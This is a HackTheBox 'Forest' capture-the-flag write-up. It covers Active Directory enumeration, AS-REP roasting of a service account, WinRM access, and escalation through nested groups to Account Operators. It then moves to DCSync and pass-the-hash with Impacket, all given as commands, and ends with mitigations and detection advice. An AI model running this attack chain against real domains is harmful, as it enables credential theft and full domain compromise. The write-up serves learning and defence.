---
title: '"HackTheBox - Forest"'
date: 2025-12-25
draft: "false"
description: '"Write-up completo de uma máquina easy do HackTheBox'
tags:
categories: '["CTF", "HackTheBox"]'
series: '["HackTheBox Easy"]'
ShowTableOfContents: "true"
---
---
## Machine Information
| Property             | Value       |
| -------------------- | ----------- |
| **Plataform**        | HackTheBox  |
| **Difficult**        | Easy        |
| **Operation System** | Windows     |
| IP                   | 10.129.45.7 |

## Recon

As always, we start with recon, port scan.
I used nmap to scan the default ports (top 1000 most common):

```bash
sudo nmap -Pn -sS -sVC -O -T4 10.129.45.7 -oN nmap_forest
```

### Open Ports

![img1](/static/img/Pasted image 20251224031231.png)
![img2](/static/img/Pasted image 20251224031305.png)
![img3](/static/img/Pasted image 20251224031328.png)

I use **enum4linux** with -a parameter for try get more info about the target

```bash
enum4linux -a 10.129.45.7
```

The most important information obtained from enum4linux was the user enumeration. We could extract this information manually with the following sequence of commands:

```bash
rpcclient -U "" -N <target_IP>
```

![img4](/static/img/Pasted image 20251224160536.png)
![img5](/static/img/Pasted image 20251224160619.png)

We found a non-common user: a service user (In CTF's and certification exams, - Any non-standard service or program installed on the machine is suspicious and was likely placed there intentionally - .

The account svc-alfresco is a service account ; researching, alfresco is a 'software' for manage process in enterprises - for run this service is necessary disable kerberos authentication. 

Other way is explore the LDAP.
We found various ports but LDAP here is very interesting.

![img6](/static/img/Pasted image 20251224194549.png)
![img7](/static/img/Pasted image 20251224194626.png)

we use:

```bash
ldapsearch -x -H ldap://<IP_TARGET>:389 -b "dc=htb,dc=local"
```

![img8](/static/img/Pasted image 20251224031708.png)

For filtering i use grep for show us the relevant info. We could used

```bash
ldapsearch -x -H ldap://<TARGET_IP>:389 -b dc=htb,dc=local" | grep -e "Accounts"
```

```bash
ldapsearch -x -H ldap://<TARGET_IP>:389 -b dc=htb,dc=local" | grep -e "Groups"
```

```bash
ldapsearch -x -H ldap://<TARGET_IP>:389 -b dc=htb,dc=local" | grep -e "#"
```


At this point, I was looking for something I already knew existed

![img9](/static/img/Pasted image 20251224032259.png)

*Exist a non-common service in this forest*

We can use the windapsearch tool for more recon, but at this point, is the same info that we have

![img10](/static/img/Pasted image 20251223042221.png)

*github.com/ropnop/windapsearch*

```bash
./windapsearch.py -d <domain> --dc-ip <target_IP> -U
```
use windapsearch.py -h for understand the parameters used here or possible to use in future;

```bash
./windapsearch.py -d <domain> --dc-ip <target_IP> --custom "objectClass=*"
```

![img11](/static/img/Pasted image 20251223051802.png)

![img12](/static/img/Pasted image 20251223051820.png)

Installing the requisites

![img13](/static/img/Pasted image 20251223051628.png)

![img14](/static/img/Pasted image 20251224032623.png)
![img15](/static/img/Pasted image 20251224032910.png)


![img16](/static/img/Pasted image 20251224032810.png)
![img17](/static/img/Pasted image 20251224032839.png)

Let's go try a initial access

### Foothold
The GetNPUsers.py script from Impacket can request a TGT ticket and dump the hash
If you need, install the impacket with:

```bash
sudo apt install python3-impacket
```

```bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.129.45.7 -no-pass
```

![img18](/static/img/Pasted image 20251224033235.png)

Then, we catch the hash and save in .txt mode with a text editor; I like vim or nvim;

![img19](/static/img/Pasted image 20251224033407.png



The password is s3rvice; the port 5985, default por of winRM is open (*nmap port scan*); 
let's try to connect:

```bash
evil-winrm -i 10.129.45.7 -u svc-alfresco -p s3rvice
```

![img20](/static/img/Pasted image 20251224033533.png)
![img21](/static/img/Pasted image 20251224033608.png)
![img22](/static/img/Pasted image 20251223054451.png)

At this point, we have the first flag of this machine; 1/2;

Let's go try to transform ths in Administrator acces

### Privilege Escalation

At this point, I decided to take a dual approach: use BloodHound for the first time to learn the tool, while also continuing with manual enumeration, which was my original methodology. I found an excellent video on BloodHound setup that may be helpful, available at the link below:
https://www.youtube.com/watch?v=NFfHUYAyGN8

![img23](/static/img/Pasted image 20251223055747.png)
![img24](/static/img/Pasted image 20251223055804.png)
![img25](/static/img/Pasted image 20251223055819.png)
![img26](/static/img/Pasted image 20251223055831.png)

we need to specif version on github.com/SpecterOps/BloodHound-Legacy/tree/master

```bash
git clone github.com/SpecterOps/BloodHound-Legacy.git
```

![img27](/static/img/Pasted image 20251223060429.png)
![img28](/static/img/Pasted image 20251223060408.png)

![img29](/static/img/Pasted image 20251223060449.png)

![img30](/static/img/Pasted image 20251224034334.png)
![img31](/static/img/Pasted image 20251224034448.png)
![img32](/static/img/Pasted image 20251224034527.png)
![img33](/static/img/Pasted image 20251224034642.png)
![img34](/static/img/Pasted image 20251225045411.png)
![img35](/static/img/Pasted image 20251225045429.png)
![img36](/static/img/Pasted image 20251225045447.png)

Basically, the svc-alfresco account was member of group "service accounts@htb.local" and this  group, was member of group "privileged it accounts@htb.local". Because of this nested group configuration, 'Service Accounts' inherited the privileges of 'Privileged IT Accounts', which meant it could create and modify user accounts

The following screenshots demonstrate manual enumeration without BloodHound to identify the nested group structure mentioned above

![img37](/static/img/Pasted image 20251224041427.png)

![img38](/static/img/Pasted image 20251224041258.png)

![img39](/static/img/Pasted image 20251224141744.png)

![img40](/static/img/Pasted image 20251224141901.png)

```powershell
Get-ADUSer svc-alfresco -Properties MemberOf | Select-Object -ExpandProperty MemberOf

Get-AdGroup "Service Accounts" -Properties MemberOf | Select-Object -ExpandProperty MemberOf
```

![img41](/static/img/Pasted image 20251224143350.png)

And the Group "Privileged IT Accounts" is member of "Account Operators". We prove this with:

```powershell
Get-ADGroup "Privileged IT Accounts" -Properties MemberOf | Select-Object -ExpandProperty MemberOf
```

![img41](/static/img/Pasted image 20251225052506.png)
![imag42](/static/img/Pasted image 20251225052617.png)

Now, we need investigate: what this group can do?
The Microsoft Documentation is the best local for this

https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators

![img43](/static/img/Pasted image 20251225052928.png)

Research quickly reveals the steps to create a user and grant the necessary permissions for DCSync

```powershell
net user hacker P@ssword1 /add /domain

net group "Exchange Windows Permissions" hacker /add

net localgroup "Remote Management Users" hacker /add

$pass = convertio-securestring 'P@ssword1' -asplain -force

$cred = new-object system.management.automation.pscredential('htb\hacker',$pass)

Add-ObjectACL -PrincipalIdentity hacker -Credential $cred -Rights DCSync #this is the key for this attack
```

![img44](/static/img/Pasted image 20251224200541.png)
![img45](/static/img/Pasted image 20251224202610.png)
![img46](/static/img/Pasted image 20251224202543.png)
![img47](/static/img/Pasted image 20251224202706.png)
![img48](/static/img/Pasted image 20251224202814.png)

Now, the dcsync attack is possible! We can see NTLM hashes
In my kali linux:

```bash
impacket-secretsdump htb/hacker@10.129.45.7
```

![img49](/static/img/Pasted image 20251224205629.png)
![img50](/static/img/Pasted image 20251224205657.png)

```bash
impacket-psexec administrator@10.129.45.7 -hashes <hash_adm>
```

![[Pasted image 20251224205909.png]]
Access to Administrator account and catch the flag
![[Pasted image 20251224210045.png]]

---

## Lessons Learned

### Key Takeaways

This machine provided valuable insights into Active Directory enumeration and privilege escalation through nested group memberships. Here are the main lessons learned:

### 1. **Anonymous LDAP/RPC Access is a Critical Misconfiguration**

The ability to enumerate users without credentials was the initial foothold. This demonstrates why organizations should:
- Disable anonymous binds on LDAP (set `dSHeuristics` appropriately)
- Configure `RestrictAnonymous` registry key to value 2
- Implement proper access controls on directory services

**Detection:** Monitor for unusual LDAP queries and RPC enumeration attempts from unauthenticated sources.

### 2. **AS-REP Roasting Targets Service Accounts**

Service accounts are prime targets for AS-REP Roasting when Kerberos pre-authentication is disabled. The `svc-alfresco` account had the `DONT_REQ_PREAUTH` flag set, allowing us to obtain its TGT hash without authentication.

**Mitigation:**
- Enable Kerberos pre-authentication for all accounts
- Use strong, complex passwords for service accounts (30+ characters)
- Implement Group Managed Service Accounts (gMSA) when possible
- Regularly audit accounts with `DONT_REQ_PREAUTH` flag

**Defense:** Deploy honeypot accounts with this flag set and monitor for AS-REP Roasting attempts.

### 3. **Nested Groups Create Hidden Privilege Escalation Paths**

The privilege escalation path was not immediately obvious:
```
svc-alfresco (user)
    └─> Service Accounts (group)
        └─> Privileged IT Accounts (nested group)
            └─> Account Operators (privileged built-in group)
```

This demonstrates the importance of:
- Understanding **transitive group memberships**
- Regularly auditing group nesting structures
- Following the principle of least privilege
- Documenting group hierarchies

**Tools for Discovery:**
- **BloodHound** - Visualizes these relationships automatically
- **Manual enumeration** - Understanding the commands is crucial for exams and restricted environments

### 4. **Account Operators is Dangerously Powerful**

The Account Operators group is often overlooked but provides significant privileges:
- Create and modify user accounts
- Modify group memberships (with some exceptions)
- Reset passwords for non-protected accounts

Combined with knowledge of DCSync requirements, this group can lead directly to Domain Admin compromise.

**Best Practice:** Avoid using built-in privileged groups for custom delegations. Create custom groups with specific, limited permissions instead.

### 5. **DCSync Attack Fundamentals**

The DCSync attack requires specific permissions on the domain object:
- `DS-Replication-Get-Changes` (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
- `DS-Replication-Get-Changes-All` (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
- `DS-Replication-Get-Changes-In-Filtered-Set` (optional)

**Attack Chain:**
1. Obtain Account Operators (or equivalent) access
2. Create a user and grant replication permissions
3. Use `secretsdump.py` or `mimikatz` to perform DCSync
4. Extract all domain password hashes, including Administrator

**Detection:**
- Monitor Event ID 4662 for replication operations from non-DC computers
- Alert on `DS-Replication-Get-Changes` operations from unusual accounts
- Implement honeypot credentials that trigger alerts when accessed

### 6. **Manual Enumeration vs. Automated Tools**

While BloodHound is incredibly powerful for visualizing attack paths, understanding manual enumeration is critical because:
- **Exams** (OSCP, CRTP, etc.) may restrict automated tools
- **Stealth** - Manual commands can be less noisy
- **Understanding** - Knowing what tools do "under the hood" makes you a better pentester
- **Troubleshooting** - When tools fail, manual methods work

**Key Manual Commands:**
```powershell
# User group memberships
Get-ADUser <user> -Properties MemberOf

# Nested group discovery
Get-ADGroup <group> -Properties MemberOf

# Recursive group enumeration
Get-ADGroupMember <group> -Recursive
```

### 7. **Exchange Windows Permissions Group**

Adding the user to "Exchange Windows Permissions" was part of the privilege escalation. This group often has WriteDacl permissions on the domain object, which can be leveraged for DCSync.

**Historical Context:** This was a common misconfiguration in Exchange-integrated AD environments (PrivExchange vulnerability).

### 8. **Tool Proficiency: Impacket Suite**

This machine reinforced the importance of mastering Impacket tools:
- `GetNPUsers.py` - AS-REP Roasting
- `secretsdump.py` - DCSync and hash dumping
- `psexec.py` - Remote code execution with Pass-the-Hash

These tools are essential for any AD pentester's toolkit.

### 9. **WinRM for Post-Exploitation**

Port 5985 (WinRM/evil-winrm) is increasingly common and provides a PowerShell-based shell that's:
- More stable than traditional reverse shells
- Allows easy file uploads/downloads
- Provides native PowerShell capabilities
- Often allowed through firewalls for administration

**Blue Team:** Monitor WinRM connections, especially from unusual user accounts.

### 10. **Documentation and Methodology**

Following a structured approach paid off:
1. **Reconnaissance** - Port scanning, service identification
2. **Enumeration** - User discovery, LDAP queries, RPC enumeration
3. **Initial Access** - AS-REP Roasting → credentials
4. **Privilege Escalation** - Nested group discovery → Account Operators → DCSync
5. **Post-Exploitation** - Administrator access, flag capture

Maintaining this methodology ensures no steps are missed and findings are reproducible.

---

## Recommendations for Blue Team

Based on this attack path, defenders should:

### Immediate Actions:
1. ✅ Audit all accounts for `DONT_REQ_PREAUTH` flag
2. ✅ Review and document nested group memberships
3. ✅ Implement detection for DCSync attempts (Event ID 4662)
4. ✅ Disable anonymous LDAP/RPC access
5. ✅ Review membership in privileged groups (especially Account Operators)

### Long-term Hardening:
1. ✅ Implement tiered administration model
2. ✅ Deploy Group Managed Service Accounts (gMSA)
3. ✅ Regular BloodHound analysis to identify attack paths
4. ✅ Enable Advanced Threat Analytics (ATA) or Microsoft Defender for Identity
5. ✅ Implement Protected Users group for high-value accounts
6. ✅ Regular password audits and enforcement of complexity requirements

### Monitoring and Detection:
1. ✅ SIEM rules for AS-REP Roasting (multiple TGT requests)
2. ✅ Alerts for DCSync from non-DC systems
3. ✅ Anomaly detection for unusual LDAP queries
4. ✅ Monitor user/group creation and modification
5. ✅ Track WinRM connections from service accounts



---
## References and Further Reading 

- [Microsoft: Understanding Security Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) 
- [SpecterOps: BloodHound Documentation](https://bloodhound.specterops.io/manage-bloodhound/overview/) 
- [Impacket GitHub Repository](https://github.com/fortra/impacket) 
- [PayloadsAllTheThings: Active Directory Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md) 
- ---
## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| enum4linux | SMB/RPC enumeration |
| ldapsearch | LDAP queries and user discovery |
| GetNPUsers.py | AS-REP Roasting attack |
| hashcat | Password hash cracking |
| evil-winrm | Remote PowerShell access |
| BloodHound | AD attack path visualization |
| SharpHound | BloodHound data collection |
| PowerView | Manual AD enumeration |
| secretsdump.py | DCSync attack and hash extraction |
| psexec.py | Remote code execution (Pass-the-Hash) |

---

## Final Thoughts

Forest was an excellent introduction to Active Directory enumeration and exploitation. The machine taught fundamental concepts that apply to real-world environments:

- **Anonymous enumeration** is still surprisingly common
- **Service accounts** are often misconfigured
- **Nested groups** create hidden privilege escalation paths
- **Built-in privileged groups** like Account Operators can be devastating
- **DCSync** remains one of the most powerful AD attacks

The combination of automated tools (BloodHound) and manual enumeration techniques provided a comprehensive understanding of the attack surface. This methodology will prove invaluable in both certification exams (OSCP, CRTP) and real penetration testing engagements.

**Key Skill Developed:** Understanding the relationship between group memberships, permissions, and attack paths in Active Directory environments.

---

**Machine Completed:** Forest  
**Difficulty:** Easy  
**Flags Captured:** 2/2 ✅  

---

